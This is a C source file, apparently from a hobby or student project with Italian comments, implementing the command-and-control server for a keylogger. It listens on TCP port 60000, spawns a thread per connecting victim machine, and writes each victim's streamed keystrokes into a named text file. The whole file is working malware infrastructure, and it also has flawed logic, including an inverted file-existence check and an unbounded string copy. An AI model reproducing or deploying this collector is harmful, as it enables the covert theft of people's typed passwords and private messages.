#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include <linux/input.h>
#include "keylogger.h"
#include "berkeleySockets.h"


#define PORT 60000
#define BACKLOG 100000

void* handleRequest(void* arg);


int main(int argc, char** argv){

    //Avvio della connessione col Client (da cui il server riceverà i dati del keylogger)

    // Definizione della struttura sockaddr_in per il server
    unsigned short port = PORT;
    char* IPaddress = "0.0.0.0"; //INADDR_ANY
    struct sockaddr_in clientAddr = getInitAddr(AF_INET, port, IPaddress);

    // Creazione della connessione, Bind, e attesa dei Client
    int listenfd = Socket(PF_INET, SOCK_STREAM, 0);
    Bind(listenfd, clientAddr, sizeof(clientAddr));
    Listen(listenfd, BACKLOG);
    fprintf(stdout, "Server attivo\n\n");

    //Accettazione e Gestione delle richieste
    //Definisco gli attributi per la creazione di un thread detached
    int connfd;
    pthread_t pthread;
    pthread_attr_t detachedThread;
    pthread_attr_init(&detachedThread);
    pthread_attr_setdetachstate(&detachedThread, PTHREAD_CREATE_DETACHED);



    for(;;){
        //Accettazione della connessione
        connfd = Accept(listenfd, (struct sockaddr*)NULL, NULL);

        //preparazione per far gestire la richiesta al thread
        //al thread passeremo la socket della connessione da gestire
        if(pthread_create(&pthread, &detachedThread, &handleRequest, (void*)&connfd) != 0){
            fprintf(stderr, "Pthread Error: can't create the Thread\n");
        }

    }

    Close(listenfd);

}


//THREAD

//handle accepted requests from clients
void* handleRequest(void* arg){
    int connfd = *(int*)arg;
    unsigned char ch;

    //receive info from client

    //get client name
    char name[128];                                   
    if(fullRead(connfd, (void*)name, 128) != 0){      //close connection
        fprintf(stderr, "fullRead error\n");
        exit(-1);
    }

    //verify if it's first time that client connects,
    //otherwise, create new file for it
    char filename[132];
    strcpy(filename,name);
    strcat(filename,".txt");
    FILE* fp;
    if(access(name, F_OK) == 0){        //check existence
        fp = fopen(filename,"w");           //create file if it doesn't exists
    }        
    else{                               //or append to file if it exists
        fp = fopen(filename,"a");
    }

    printf("Request accepted from: %s\n", name);
    printf("Receiving data...\n");
    while(1){
        if(fullRead(connfd, (void*)&ch, sizeof(ch)) != 0){      //close connection
            break;
            //fprintf(stderr, "fullRead error\n");
            //exit(-1);
        }
        if(ch > 0 && ch < 200){             //it is a valid symbol
            if(ch == 8)                     //backspace
                ch = 254;                   //special symbol for backspace
            fputc(ch,fp);
        }
    }
    fclose(fp);
    printf("Connection closed with: %s\n", name);
}